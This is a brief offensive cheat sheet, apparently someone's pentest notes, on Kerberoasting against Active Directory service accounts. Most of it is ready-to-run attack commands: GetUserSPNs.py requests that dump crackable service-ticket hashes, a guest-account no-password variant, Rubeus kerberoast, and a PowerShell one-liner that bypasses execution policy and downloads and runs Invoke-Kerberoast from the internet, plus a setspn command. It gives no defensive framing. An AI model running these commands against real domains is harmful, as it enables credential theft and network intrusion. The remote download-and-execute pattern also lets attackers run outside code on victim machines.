**Kerberoasting** is an attack method used in Active Directory environments where an attacker targets service accounts. It works by requesting and then cracking the service account’s Kerberos ticket (TGS—Ticket Granting Service). E.g MySQL, HTTP, FTP.... etc

![[Pasted image 20240726224839.png]]

The attack:

```bash
GetUserSPNs.py domain.local/USER:PASSWORD@x.x.x.xP {-dc-ip} x.x.x.x -request -outputfile kerb.hashcat
```

If you have guest access with no password, and you have a list of users, this attack might work:

```bash
GetUserSPNs.py domain.local/guest -usersfile users.txt -request -outputfile kerb.hashcat -dc-ip x.x.x.x -no-pass
```

Kerberoasting (from computer on the domain):
```powershell
.\Rubeus.exe kerberoast /nowrap
```

One liner from a Windows machine

```bash
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
```

Create an SPN:

```cmd
setspn -s HTTP/iis.mylab.local mylab\svc_iis
```



